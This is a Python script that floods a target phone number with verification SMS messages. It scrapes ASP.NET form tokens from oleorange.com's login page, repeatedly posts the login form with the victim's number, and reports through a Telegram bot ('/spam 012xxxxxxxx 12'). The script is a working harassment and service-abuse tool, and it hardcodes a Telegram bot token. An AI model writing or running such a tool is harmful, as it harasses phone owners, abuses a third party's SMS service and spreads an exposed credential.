import requests
import sys
import time




num = sys.argv[1]

adad = sys.argv[2]
url = 'http://oleorange.com/login'
r = requests.Session()

head = {
     'Host' : 'oleorange.com' ,
     'Connection' :  'keep-alive' ,
     'Cache-Control' :  'max-age=0' ,
     'Upgrade-Insecure-Requests' :  '1' ,
     'Origin' :  'http://oleorange.com' ,
     'Content-Type' :  'application/x-www-form-urlencoded' ,
     'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36' ,
     'Accept' :  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' ,
     'Referer' :  'http://oleorange.com/login' ,
     'Accept-Language' :  'en-US,en;q=0.9' 
}


import bs4
from bs4 import BeautifulSoup
page= requests.get("http://oleorange.com/login").text
scraped =BeautifulSoup(page,features="html5lib")
v1= scraped.find('input', {
   'id': '__VIEWSTATEGENERATOR'
}).get('value')
v2= scraped.find('input', {
   'id': '__VIEWSTATE'
}).get('value')
v3= scraped.find('input', {
   'id': '__EVENTVALIDATION'
}).get('value')
data = {
'__LASTFOCUS' : '' ,
'__EVENTTARGET' : '' ,
'__EVENTARGUMENT' : '' ,
'__VIEWSTATE' : v2 ,
'__VIEWSTATEGENERATOR' : 'C2EE9ABB' ,
'__EVENTVALIDATION' : v3 ,
 'txtPhone' :num,
 'btnLogin' : 'Access' 
}
print(data)

for i in range (int(adad)):

 r = requests.post(url, headers=head, data=data).text
 
 
if 'rfvtxtVerificationCode' in r:
	import os

	import sys

	import time
	import telepot
	from http import cookies
	from telepot.loop import MessageLoop
	import pdb
	import os
	# replace XXXX.. with your token
	TOKEN = '2105905758:AAFgUW13XjTzO2tTRBalBIj9MrrVYNnNlH0'
	bot = telepot.Bot(TOKEN)
	
	bot.sendMessage(sys.argv[3], "Done Sent " +str(adad)+" to "+str(num).replace(str(num)[-4:],"xxxx"))
	
	   		

else:
	import os
	import sys
	import time
	import telepot
	from http import cookies
	from telepot.loop import MessageLoop
	import pdb
	import os
	# replace XXXX.. with your token
	TOKEN = '2105905758:AAFgUW13XjTzO2tTRBalBIj9MrrVYNnNlH0'
	bot = telepot.Bot(TOKEN)
	print(sys.argv[2])
	bot.sendMessage(sys.argv[3], "Error With Number : "+sys.argv[1].replace(sys.argv[1][-4:],"xxxx")+"\nthe correct syntax like : /spam 012xxxxxxxx 12")
	exit()
	   		
